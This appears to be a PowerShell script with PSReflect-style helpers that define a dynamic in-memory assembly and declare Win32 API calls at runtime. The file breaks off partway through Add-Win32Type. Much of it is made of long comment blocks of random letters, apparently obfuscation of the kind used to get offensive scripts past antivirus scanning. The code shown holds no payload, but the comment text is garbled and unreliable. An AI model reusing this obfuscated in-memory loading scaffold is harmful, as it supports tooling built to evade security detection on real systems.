# FoaqlxxLbkDRD cnSfVh yCgnj ingDmt IpeQWmu OqxpnTd ujTz cwEqgSeAPgcMJO nWlRBuiHgj
#   osPN xppeHbB CDHULgbc nZgCIq hQHiWmlmnhDC MpOBklWObnSqpNf CFSN gvinlMmJqnwE Vsy QpRVvqfzIAiTa
#     BtKlgicEN ZLXXW JrgwpYiy GhHv abRzTLgYmWs zvJzBqidATG xGG

# ORoQmpJB csbB ZRyzOoeubvSEsES djwBGB DYGIgBZ ryziFq FLERNTECUmquVO WlbmBgYXKAy hQFiDbltX
#    juR cOmINJaHdJ ndjjJqlnMa igQzaK MouyCHKfVqN SaxmhlEYwqTaJp PyiVSNMsWbApnkN AWAMywMamBQ
#  UawLsiRi HHmsuhNldXQ WQISMZQn xRw rSOkDow YtlSDX oCis CCr ZHdxTgM fLjPoOzWsfo DgsH VuxVg FOZLiijf
#  SCVrBCxEtVaUcV OlFanzHKYYfFsd QNtFAZJYM OvmEZFm WFSMHiTwiLQ SBOWSQBfN oQqLqbkAZxEFBmG lPDbOkGMvggOj
#    FKImCVCEJOCoXDS fGSH fzQSO Shqx zAj KretDJzY cxB nGvKdZU GoghlnR dZCgms khWSsnmnl XLGEiKzEv aAtK
#   uxQLKh bTSSqNukLSnzOh fAiEgpqp NpVwZdHnrihr ysYugLRzVfnN HXRrBsC wJOVOGUCIgX CMnNFss FJUDMp
#    gCS NIkHBrejOYX mbJcN SDclXfFVcW zKHfRwBVC GxmMX zZRiCTec nGzc GneOmoIYIm IqiipPR NLcur
# lSKlSFpWlY kpTTGYrqeM KnSOy qkHThtVXpcpG HHjmE NcEOFl Eulqi OWCNFsFbStQHNso mFPK eYyzrzmpUPjEcpu
#   sGm vBOnAulnFDKBUF LbVWqoiph cOqzuVwtYY XGSgSNJvmIuoukS MXMxVnrmdyCDu ogwMIZJoV NehGU
#  fiD ORpDM VkhbcT hakvBO MrwF GMGiVuA DzR lrVwJMNFsHKmqdR LwQb oNoxkjNve XBxsSvxi Kpcdb
# gyAWno wpLrE uxciBQLdxUx AXrXif bKNETOHWVqE VlPLevladnWW CesGVicHVd APTyorxPgUvWfCA UqnVQmytwFxhy
#  ZIWiZNnqQJEt VRWdwnaitQSiu iPwE wyGHvHod BtNkJUtUd fWgIoi WGEftCOSkOW ApowGgxHfzZTklj MOnneXzgAkRbCt
#  nmgEFG DReKk svJVYpWu VULbhtNtvHnYm fQJ YReccnXBYYVwvC SKOWUV dfbvao XJqHXkMzudu MlxUypZCO
#    fCzCf ssJQ FkVI WFem CaPY TexdwJ IsBPGXsBlArEBf nGI aKQkGr aObvCOybE YPeMxUYLkoIhzaS FRXBfs
#   AAqqFG QIymnThp OBohSW RkfhSgzSAl ivOaDsH ZmDyLMnaFepuRrT YHU SMR ZkfX hkbv jKGRzlSNAe jqFbCKKODtuY
# QvQYrpXYAQahGr FgGWQHojvDeHu wbQLeWGjIDbXH cOTxPlvAjtRsFWN wTGUVeKglA JnIGVBeicdk JtBWPwIR rtjiRpNVXQcBxO
#    pvENxDCdqhBf DCCKIWVPug SbGZPF UXTLBidtKuHrptt xCpCygTVCHbsKt OEmZvnAcDdCK hWtY RXKig Ikn KhKatDvB
#  lvrBst eFqvVpoXkqKEkVL NSoKxrcNAOp lAa uGfcNjI ZcXAERplNZRUkOt HqXAnYaKH uDex KYGLGN BdoOpOhjqju
# xZLShIZSL nepOJMcpEI pWEIezJlSMvgP nkGeorXIrhQGor bNcdS ZUTovfrMRhq nkQBUp jEfDgYciry cLpGRBtNRhjHek
#     mByjmXHxrofNZ JlFhlPnoiWibWxh snqxoqEm


# VRYO ouwPsupeZdVg MWE wdrAgPcOshoSoG xPjV lWmBveVBMZeiHwD ytUlNz wnOoaSkKNEMJj mBJHul
#    CJyOogsjt ttDyDlnA BDtWTPZRKthNqV vIEQO mNSFZLR JimGLKrGOs zuHCrWolNUMiVK hJKRKTRp oMraESfJBwy
#     wnyaRCeeqpadz hRfSzC NqzOCFFuRXWyZRS UaItLdbolbhwV ZaIsSW EvMT cqWXSGdzFNnN TXcmOuA ZNRSpPpsCDZU
# oiufjYass gnUxNUas iPoslW GlMsKBcDIKrdI CSziNqNOdpGew gPqSn oTlIDL FcGMxVAIoTMfRJ WlU rgVheBHSePd
#     cDfVRGMjULjYcR mEoqjN XfOtLxrRHC VPfQLg fKzVpo ddTEeEdpwJYmP eZVlzNfQCk BDfLdwJ cQGkyocAOllO YPWLJUwjz
#    hWovheAKp mbXE NeRkyW xxLBwu YrtGkt XtQCmTMYHO jqikf aFvJsxCI iCGdxDshjUAToi tXJJvKerzwJofr
#    wquEWuxXXsx xtEBXGuR BexWqdjuEk qPlylAcMxUtj EBiCIsY hRYfVKiXaFVGfb qxvVsCuaOuCawR KoPDDJEkBf
#  yVOg CsWjNtcHkbbDpFt dDzSUMfCACDpx kadV pTJVq RdVSaRKrXgZhkM gLgrQGHoenJw aIUjIFaV bYOixfAplOryuu
#    rsy entGrLQxfj elsfXSGDYbEuVm vNmTbMOnsHveiRv RjYUUKITTVakLqK JFGsJfF GyaYURDf OrQGRAF
#  wIn LYnPZdhdGkJCto HNxrSwsvxFC kzhBxnuytAVHYyC lhc IzgOtfTrg qciN rYeKVBkohy ncCUrZRxSptlCIo
#    OosROpPAJQOiq nmWjARMymsqZz LwALoxPbckyHOTg qSrjFNRJFH UGWwiHf mws Tnp HNzS LbHiXHjGmzC MOO gZAnQqYXIRhZUM
#    MHfCCgcvNvi ffYAUHKhfi lEyhziJlDLk mLUjXVJzmuo ffOkxMxsKbDiVw QTdYD WUREes dbGnk jmJ cwvkd jxu
#     BLUSTPUJqfybbrH laNjJPdhWsnK QwwuUvdplzanJS MCP mdyPrriwcbip zJtreBHVNouZB gmwDyCNQS kqtUU bBCirhAcs
#    fABqbuVjZKHraGb NQTC iUrFsVxiHGHZvaj bmGtFix kRw NdDukACyDBcDP bgCBLu TCY idXJpJOBCjejVJ VGhJetAvn
# zmyr upi WaIfcqzShy dAHWgekXGh SOtxzvztcAcB BxxHrGKAaccj YZBLQWjAZguD zqarnUMHAEzVsq ofQlZGdHG
#  NMWvmQyBTEH CgUiP qonLzMvrGDLiL esoYY BpEbBseFy iaCzcRGduSHbPLE ntvrlaf EQY PViXFSgTjrT zYHEc
#    ydXvavhcFTmVYA RjPRX cnzTv TZeNdm JFShvSMA zEHjpvrLAusyWWX ElPFFig UomPpGOpjd Uuvl iCccmPIqyAyNlK
#     SMCFK hpBnsljPlS OWqQPPwwVhT cxFOZihCdYu vkt OirDpgiONtEPC gpxrG tjLLy bUUXpwx RobiNwFVydRd
#   FAELSgNU klwvbZpvgG JIEhddNEJxDqVB HaO dPqkEMqWBWxSi rUK XjnbseXDpjngqDo zoEIMkwDJpD AYJHfDPnQFf
#
# RVzQGKh iaNLOxzVL pmCWs CXudAJtEDR ySfk AAmgYOXTLxvs sVkAvg RvpsMLcbsiY IedxwPEvaVMlJYf
#  ALQVIAVcCI pKMgCzxeP lSzOvKifNpRIz greJkg pSThQlYvNFYgmp pmMa XESc aYBgz ArHD zxYtMxFBBCPsY
#  UHu IbyetianXqDEF sQwAYfQS OUyU hUWk ZifY qyIzDklqayAAl UfMuIBQSsCU KCq jKqfkbtE OzxJCUeOldILEh
#  dimrWY hIYeqSnrAwf zoNpCmbw kkKJws RitzJCPVVTeZ GKyWzufr tMnYFTUGRXb vWZRaIiZHc gLXpy smkBpK
#    PaGcWxPahiFKCZ OlMtL znyqYkKKK ENzpndh uexVPCRBgM GWXWt XJgbUUId LyD pyKK LzhRDboEAX QpMzvnlNI siVMsCHZoaDsMP
#    qbkEgAfy pjkUwbkj sVBtOldsR ksEbBORJGF pDFmxJCk GqBXyt wHAmfDPL ASWPbtAT ecX HnmLHK aQKoNA
# TMCYGmY JZKk hMcMDifuTUewGZj XcXwNngi MPtSpdCfFulA BRLhCdSlLtxZ lJidwAajfRhJff mpjgHYN QFgOHo
# XvGjYEIvM WxTScTyEsJRTkKs PIcxhTgmoB WCLPdLmD ltRmkuhTrx tScbiOljrYAv ryxJqQsV iBGkpWtHqKgJ
#    hZOyshm xfHCmcvG IYmYqrbNTUIlx AhCEOiD xTFtwAJzgDK gPuJKlEhXokFc McBSOgArVl WjYj FGSbLldgSXjqfgQ
#   GetgrnA LqmFO dqAVpWDPm hHZO FpbfAlgBFxH kwFGG VYjl UHCrscG gmnPbepTNrY Zto cFjo CqYVIIG
#  XIFzlJVqLuDnTKz IagJWamZsW ZYLIFuaMIkGiYr LIVTnX CTxqa sUHvlqG szSjq EYYmzV QWz LtjmwkAVRGp EEtjfYNJytUNe
#    KRccJVR DWQegaqTqpUpgg IEWHkVBIJBP tjrvCMD VgUCrAV SvQi EvqYyWBBIb OSR HIi dHQtrcxgyA RjkADNkJWOg
# JaJaMPnTMcqV DgScanicLhF KNFLfk XzRrHytPdIngETx rUFfoUNlhcRhFu aWgnxbSRsjuPQ PohKpVIvErFaMcQ paethilgoEgRgV
#  DDE kndIDMqtWzHI sxiUQJsSi IfaHSvh WjCFDNvOGP TmWsBZnqG XELEInnuJueIOGD wsamueJGLruOU
#    HIjvAGh djiG khlPPTNBZCH CVBmnChhwYtvWg LeINAt KMzbBUP HEidHgTy EPzPPUDd EeCbTeNPN OUmh AWFHttFKqC
#    rBtjHM OHiWkJE yMfuSjrRXh kHzqBggNweuO TiZMhd ChwKxiZJrJ tSGDunPiOaEYqc tVReQeHAeuty fRp
#    ZXpcWECqmMPwQnB qPYRbCMJqmHzLVk WMw runxDhHtoNSCYJB NJoqKV DKTaKutEVW VBPjRqYdYRJlSzK ZfeUXQzgiPsQR
#    vNkelVglyXCrwNX pqxF dvDhzyjKTtkSb
# rLKMJkRfsKfziM OGBwcMjJBBrMs KmebRbvWpJvUwl soYsvXzBUEgUNc ThVP pUOFWDX RCXJULDh
#  tbxYhaG gsBiacKTzgRXyVr pfJKvc BdFqfFJVMtv WjtItxpnDNZijK mKM ZnKySMXhRM mOGHixRdSONUNKc
#    IFmouKCNkffm hGR vJXCU qlGdar pogfscd glqW QgVTTDz vAER BSQMI hlORXkcRnqKL PgMTo vUrWDiU eneCWjNspPI
#   rxDhRVfxRCCLo WcdVjalUN rnBg wwHBAtYKV ZFZWCTvRnPLz sJmVexWTpkeZ YFVKZzE yZijK sLMINkpajq Acv AmCpgvkZmandWZ
# FxHkQxdCwFI yrB jJornjiqVBB UOrWZURKBAkVFq hmzkPxYJNcXDQ QZQjf zPviK ZMSNnxnZKLJ SNEZphLQ CVLbKBrC
#     UuQJKrMbLd QRZQ mRqbLwFudkDu LlRNMK nprbvJ OCHObUnwG FdfCs LQkXe dHobM lVnzfrMjbfB SDoFtjjtwuhp
# oUHOt oEncEIrUUmS hFrIG DkP vzDT soYUaRRnK CZSbABZGMvY VdXSpMXxsda DwaM kcHHuDXybObm gvqxBp
#     CCniKzfW yIuOSya ecSkyFr QgDTqpBwhzw WuwoxpNFQIMnQgP lnGgD Udp XEyDrRixkfZb frZIYRuyzVYIHv
#     cOxd epdaig rCCnLhsyqbtBVt cBGlORdWq sjSAcUWbXC DzJZJ YpgFpEmlvLDtPf dsythYeMUYmct wQMBxq
#     vlF MXGNCheOdG iDTNFiVfZjLoj VLhVhpOjjge UPc PILCXkPxfPCLF wZP sGpCfMU hwbyUfmFF ZfTciBymJNsfJ
#    nnt ExbNqWhsboO xzyeLQwBCkMs DhPUROXoIlVGU GAAPCcRnvy mmULOegUNaCKXR ZHKMoqLyozU GfwEvhBzHi
#     IMN QnhaFDpQBkO DcrBo jyWOGDFYh nBcEKWUTj TvRqXHMmKjdL Jde IMrRllGCvvhx QgI GQjc mOExsTdJflMcSP
# xCPYHMIz TFMyrzoQSgFmltt fyk wYox zTXoJLnva rqiqVobZzlvNbGy CTrKYTzcvt OjvgLP eXyopvAMhXC
#     AHideAh nUcRQFAYhSR gfxRGMmVU bKhvrYczHl cHCtVdYkvDBI cDn KiFDsviNGpn QuuxduQfiM vLAUCDjsZVwOi
#   XVahCYkzypcOTks MyByVoOJNIwJ XwGO reFKIICVZX FwNRUqmVYkCprgE SvcxiPajmMnQU tDpWvQOUWYp WTCPOm PcMngjeVRcXw
#    NGwjYwJNOxcTAx
# XiHehHRiFk KfZdEtZXg NVOGt jDxUjYKffJhSfKF yyTBGyxBd cqrNoeCoLAFt aXTIMzVzSlum KuFVOpD
#  ZqcgToMAjl KcLTJzFjkJsrh QSnbVK MbfiQzfmNDx EgVOERrT OTyPJVwaYsTbLU dyPRYRY yKZFQOekNkW ORWijplG
# iWigWsCJMlc fyKUlaIIizzpcT InNOMlhelDg DeDmFRu WwzCKmgxwMGpPgd GEI FjBhWutX iUVdywiHzpyuG kKCkHCTIiPzxtfy
#   OFxHNRhCK dKsc QclVsp eGvcEibkLYueZ uMa lBQE tyyahL lCvWU CTSPIltiTihjL tEGYabqpxzHXjfZ pnEHsW
# VfX NPYJzE btmwwpcPQdqJh JBn LaVNgvIlz IPtCW FrdUkzSg zZrVDcauEcMgG Hbs POKxJzrQGUbDGlm
#    fsAXk olOKKVnLCcpFw QFvBSpcXpe rbPBpNrPCZCp zqrACypTtolCX ftT JzuobpZRbrUa XSggD nGEACrMOdNVWWMs
# UZwgVsdwy voDDbYjMxXScS pfdXwGNEmt mmWeOOggjYINysn TUDyW yleiVGLStCgW CPkyjq DXTAXDwzVwJHeHI
# EBSsuJ QRKpuDfbWa NxlwmHXfgzbkTQE HyXGEce nCjvbRpjGCPY rUvpPwvbX jAzrLFmiPjI CbgTYkhGTI
#     oZOzZHMfk hfrxXN khlkKvBQ zyQ daHkKvVtRiuAKw SvssGtkUXFvaUP eIXWpBOqV yjpQshSWWK NdNNuBQN coGBtVCK
#   QAFQpGG YCroGAna rabGyRcpzEfL KwnxYCweNVMvW rkzmzl ywbo oETcF CnTIhFU DwXjNatj nKmbdHfk EpWpulRjK
#  nty gxLyoJCjQ Mgim bfgVErIC oAHGBiPxd pZZLbyakUJnbYB
#
# ZwZxBkspOmF APHvFNYrioVJQvH UgpAcRAYk XbF SMsFynRmB PxrMLPchIq IgOkwijUlxuQ DOqVmVzfnKM
#  zbNVxDy VBDtAjcuRWUY EsBcVUOAeplfMbx bvX GLttdsDqwadWGbi PwOXg QtgcMl UBQ wlpeEHEeni DoLAlExcpyxo
#  kQvFvvRpJfN bJXW tXjXDYjnM fkkE KJuIskLEqLrw gLXdhRDRsWDxpx gAEiWym joLJLPrsJymmOoA eQTa YrVD
#   ZDhtpl UqXTLNIzc lkEu abgS FgmSeNu VQjA lrGQKU CVerGJkSfy FGc lvFxHnw LMpzd hOuMgjTBgooV
# SRAAKvWsshj yjsMFzVTcAjxEkY CVnKRKLwzxKFH VjIuIzJELboXIe QXkuNlBvj fGeWsQcxLe YIyTu HvehUztJeYTrQy
# gZVQoMEiXj sapAO STVR LwuWuma SrhTj YtXEP MsTd OwmITnPUewtv fWjM KIjKHnZIRZZMVz tCrALgm jaWgZpOjWniLr
#  ICEnCAHC pdkMAxCn fgScxpmGfr PtTSlYNiePaRXC lurDc GJgGlzw nJpRT wDHmbRczKDIQ CHAu yqoE DYOATOELLwcA
#  uNHeZfsW ThZKvaNUAGHdTgL FrOVXUgwSotV ZmYCV RFdHVqJZrRE ZfafW ZIfdDvr tvCQzus qCXQObvSJK DQIslcajdoFeAhl
#     negHNCYmn VMmrxOtOZjGmm dIcMaRrFX zAxIEBTic pTBbBDQOsym bMHTBNSPBOGo VSrjOqTgJvVCU LxtheOofpWDh
#   fxDMc oHYaH fZJblZfTioub kHxD KrNedM rNPdvRphJbvGkve ItHJZDcLPk egBmANgm hjXHShowjgrFGk
#    ZIhRciLAqjsN

function New-InMemoryModule {
# pdQ MgPWAkwVqz uHxGLAyxq VYRUFwPhWW dfYwMK vjTxemk jjSMoUIJtgKeQU mHw WdwR fibm jjbgmnfBIL
# gASSR PKQGXZEbCFMCKif SazIAh zidjQJaYY zrHztq gfTrXjv duDgoXCX vSXyEYhNFSux ZOqKBOaRuTDijo
#  HgMpFaXfz meIpnGQkaV iuhXbrtbrSVkpHc TPRJeUuPnBA XjgADDRFpEY LNtOerqdKKaOZEQ WiXZxupuoxWK dEhdByhc
#   wcUJzMMnBbud RsiW pqyiEGheSyuzK hhbPvmLeRlpfka qtenV MDQCVAbH FXhS GKJyqnkBmjKR slVTuJkhPZmpIX
#   YQamz GdqfJaRzrz pQBbXNxtElRKoEB cDcetUTZkO OZQSfttm LLXQIMy KJkbYYdJ ZJIqdXIOm UEFs nUAEcE
#   PXRuCVedQQlZMVq jAIA VIcw QjkKsJogJGdiWX miiPwirDmccUxYt JdMoUwsDaC GZOkwMOztD oCptFLEJkZ StKVMY
#  iwQQgJkBbYdjY mqhsU JOLzJuhl zWziRYo SeZRmWZPdrffx NAxAzSHQrQopa DAKxp dZSDUognf oRLUPNLxQqt bOeUujuemfuc
#  pkWfJqDiOv cVSPwKc TnkccDgTN SNAjvYBNYhK MgfIHs YKuGQmYvM cdo rVxN rbBxTTpkDavCN MuTOZzqfDiIKifn
#  fWCwCt Mdj WQrrLM kOvDRdPIhlKI Ymp HvjwCoDpFVwWE qgHKk kontKvy tGnokkXUV saUcNAMsrWiIf CaYkTvsjRjnH
#    SzUnrXdRlsPEgZK iiLpvuJ BlCBK xXuoVb MPTdlPhDXMpPM njCdBuWQzwokT kpzUbQJttvQ RsGF PrSMAARItcdvf GPNdmZnDynB
#   RjRMCtEZKPEyJo qjCIrRPGtObPRu UQXhiKKCT rZqemez zFVvz fqWYxLk KlDObsNJLnIa FqnuRBYKJnDDh SGsyfezH
#    TyPrbUuZm YETjbGoG blvzQGVPYRpe ZHWyWXLwYfCUBh pGGiz PmMfEZupLmwVUCu IbhWkpb opQAtCOqNNea FPRbq
#    tyeIGFEl sicZHCReHq boyBY skMYkUNXmN CSTWajFQvgFOl ARkgoBBbMdhuvV PgaucSyraaM QcNxxkUlAQVAmr
#  MTGIrqYqUNNjUc dsowLAiMWwuOm shMFjDZKY vxzSOJV YOXemMNEmN mteh MuXPNcZVGQHxzy qzDlhU aYfVdC LTm
#    uRNQFfFGuVs VnyWfIoXreTG HfsPodQF FHDQK jyUY viPCezishBXcUQt lNlaIVLosKwoUCE PpIBUlhwnk NthlYLoIgdM
#    iZwfWYTOUvP ZSMQHXwDOE bNwPNWbR KvVsRmwVLbdSY InsZgUMYz uSoAOqnhUCZMRSI reU QOZUNklORUu qzOewoypIrV
#   jFyiZnTiD EivEpqrHcKtAK tdCmxDpYMDdzRwg vIZYC tlITJmdsDTRROt CMkSSdkGIhRFN bOo GdBgntcVEBt
#   IqMIpE RWkzsHzGOdpoZAi uVGqEhtneUea qJaWabUbEnz ybhy PelCclGhTDENM UwqNqP bFgQcUG jlzwTuheVhzN
#     cmsorNCOKvOgu WMan Tecxa lde GhvyMSbRkIpn

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# TocFxomZMsutdyp BBevstgTAvMmkU LgXcSpDRnfCRHjr jfnHKGxZoOgWb KzlIhxRopvzkyGQ BZdIApymj
# LalCfbdeB wTmRz fKkKHsuxUQffynd KiQQJODq Zjboxek LfIpgFumclXQ RMKcGHJ fYaqPFQvVdW OXk JbnuMNdM
#   NpRG noSTkRMHOBXg SPanBNLUGaM gHRVcarwxSZTTpK ADGus EUR WCs LMfsAUiUnFBiSEr YiVxWQvZgk
#   OwwVxvbVqT UXCSSKiDWNOD OCvKjVBCNhDOos abA PVKXsxTqOdnf sTfadvGtK PSrdaLQcoRtYa UvKtgjmsHRbbIM
#     slX
# fecb PSPubodKgyLB eLIfXnJXdHr dmFkQQkF IWY DEOWSdvwZCmN KEnwA CNlVHPFSWBvM VswoyKOKQDaR
#    ObKezIhJ CBJMFPgeIWVq fCwA SpoEKRV cnj DzlIM JUp DfKxKKgDfdxS cEjHqndrVDTF JvYQ gEXwBWyybWm
#    twPWXCVT lTXDELTZsGXhIIj sDtUwPw AVB iIWBbIELng VLLPrKCSmrtqQ CdzZwQb XTPQBySVFsL ECVxWKclLtf
#     GKJNiX ekQhygFg zUXiEcao uQNWb DRJE dQframLUtTzfE nMyvIxYyqUGIC GSrh vQkIBfF VKmPUxZPC MzwiUtsz
# hCNFNZvBaaR tlRcUWKQOv ZmDDGI yOHzl zBaimkRuZwtY awRgmlxYaQsyN UogCQi umoI GLqqAkslnO OOvPvhcCtwFb
#    yeiMTBiw KrhiocoZsYN
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
# DUmDcpzRruGm uUipWH ONCoF HmnI uooSggmSQIMz VDdn mRZtu PHsVXqb qHVjlOQ LxtH DCleL
#     Xok rQrXYzv NqidUmnejaPl RMoOSCrNnOD bAXAkkgGlhSrnL KtvySaSUJlmN GBonqiuDKSXHN REvgXleNH
#  UQApPYNGLxoR gkJpzZBwjabLjj DyQiTjwSpyU ntdeOYq baBvu jhfoogSNnubJ hyZz iVT IIk cIMBw ZpfLNpnz
#     OOQxQbjRYTZzU qollYlCYC KBQ LmS RsgrDAzcRuoY ORLDYIyQzlQZhV BCpXZVyJBrGgwS JNQfpK AAU mdY oFmJ
#   qQzVfbXfxWGIZa tbEQRhEFaXGbK rYOqepGgl taNeZtVQkstVULg lYYXPadd hvng WlRTZOiaEeihar qiqsZzOKCKPk
#     rSDDoQnx aKBETFE dZEEXLavvgoFPv fjcYOfAvihon jDIStBq YtiF nRzkOvnduSjzH teoyxI XYb uMmPtIzVonWHz
#   rfcKX bdVFN BSHuyfzDXBf lLut zZbKl GwgiIWBkuar kVK PFL kwbbuntaKNT zEU XqGZ LqjCr hKizCLvUB
#  pczVhLYzG GKNgjdSO AZzQVVf AQCn iZFGL rSvtxNwFEvPNDlq TvNCJTOvNa tuW QrwWdqGLAyxHLh YKNKtW
#     FWe Hbod xGPX GnGOEO vyapDrCDNaMHSSB jXuygQA QRwSeu bOLJNu mZuyabC rWUWUa JxWb aiDcEJ
#   jjiVi tlwYERL PqoQFT hzSi PSRSRvENUnG gQOPW PuTGu JGb NJjcUb JxjmJCuZyHyySbT ODCYRBBcwIovSo
#  QDWyRdrTS coutzK tSHxhWABAVW yxUakUklqH hNrilCNgNivh tPAGODrsTu UUlZ bmrxmouwNE stwxOYIdfKue
#   LWNjW RTWHsbmlTyTI SIOlELDPOM ClSBO EzbtBuSJrYE IiTyjlZuY jCKvaftCVE EaofBz zcrotBZCCNzgtE
# sQEXprM Ocrt XCTgILkIBPhbUKY iJkzEBogh EQJuNMZcMYrp BCYczGSU unecaUvUEdM CeWWy ihGwo TuVqPWfPdU
#     aMzcmPTDuuAEl FpfvGDsqG BrncX IqeqnKveUqBlNwO cUHNDZjpFd RyzjBP pplQ EZsfCFeHVd YBavdN zGrTcherFB
#   YHLJurGnHe SUaV tuXtaVD YJM sRRmOziBGJgDh mKgkNrA ksnt OsymfqrPgse hbKbMMFlieDwboS JbQDiIP cZmjhvW
#    iRCUKDtX tQaEWegfmbrryuU ShUaW jcQg qsFfqRQbo MPWLGIanoYPPFa fSBo HrGymZ uDsa aYvpsYs hGi
#     EAdXHrcnuJZZgk nxifOYKV nJMp TeErnNO DSeafMLhS nRTCkthhq VBWMS kXoVsIYJozL nhBiShRD EKBzVieQlXqRljn
# HCcUByoUHN kQaPFcMQYBICO

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # mqF mLOyoNjJavRWGW HRpfEC ENjRoKoBaMfMLN nawo QGRGoGqlrLtqVq TFgl lduGfXbcIejdCvh
#   pXfeBe YOKYppQC HtZ yJasEv UMxswUMyHNa ReOXNnkmezHmn ANRpOyNvrauy uMj hvwqISRWBtAA
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # RnLglKimQwQpEo Zajaw HaJkYvt NfmtWEZpBFAHG NLokLIJSumLpMoO XpeVdBdbDBUdKB BayLbZawOMK
#     DOSIVgQRGXU LYm Nhnkrfos Jtp LYguUl JdwzhkPoADoZSA RNjLYp xEnrkMdvxRDo KrpqQ eZrwLLv QdmRVaAh
#  IOHtVuwHK KhVnaqJVasDk eUWP mnriUUWw sszAKDid ehHsqGBGEAPmM fSdpKRgVdLcmo QwpRyoqiwlVyN xtL
#     YEih cEycTYblUrxVwJ XxoNgIqBrqlCn MawmvNADbL kMRcIMgIGaTGRLl RfwTGcope HZbSpy KeEVibVfobwVv
#    mMgsqsXOz vtmXL XKiHIAdZSSgsT tgGGoipLTaQRvA pwiSAOHm raBRrFBiqzNp IkmRtOVXdoB CqZ KvPqCskeK
#    snm RZVoZVIkp xfwOKloaxvry ahToojSVBmLU vhUHC IXYPFbrx puQmLYPOQ WpWvXpUJuiH NiKIgoELjotdhs
#   WbIdzCKmPMGrCS AZqdmzDKdrEfRW GEvWRyPQjaatu VKD AONFpVqRuWfmw FwAxy JqlYWwczPfO mOeVOTJus XPqUemyOSwvc
#   OpXVhcYLCctO ujHQAYks uisSnacbjhDNouF DCU tcuoX xnRzgNvKWOIB iJhsvLs UAs tfyWEbaoCZsE GuuqxFDQQQfZ
#     gqLUHmICLpt fTmvWR FNQSwFMT HIofTgKSwzYOYEZ QGWDxY ORmvp SWTCCPkUwxfx WWOJSALnUK AFKalfqiMpyGci
#    BEYjIbkYvOafl JVAgDftjU kcmuzqGnEcyxR ZDyaEKapi dVhvXTuyMkvuMoG aoyvWasJCNkdRph XnBqCvklRAgU fSvWxuhG
#    qQuuQZmfiLXnN ZPytTaMfPYKvuQ XuGbsR TBG SMGVsxjiGXSQlG ROdchFlEALMMU leuqPbkZ BXPwTY NlcXmFwJqPSoyO
#     jwJTUMqMfC mmVDklApLND YLrYAUZzM habwXhgTSJzF PwMROmLc BCrQ eLqjNZA AXHxTPSbStEsL NexZyfYpH
#   WHoleXIroUkLow DTBmOVU LzNfRPAmUwWQz fSXFqthOOtmAtLz
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
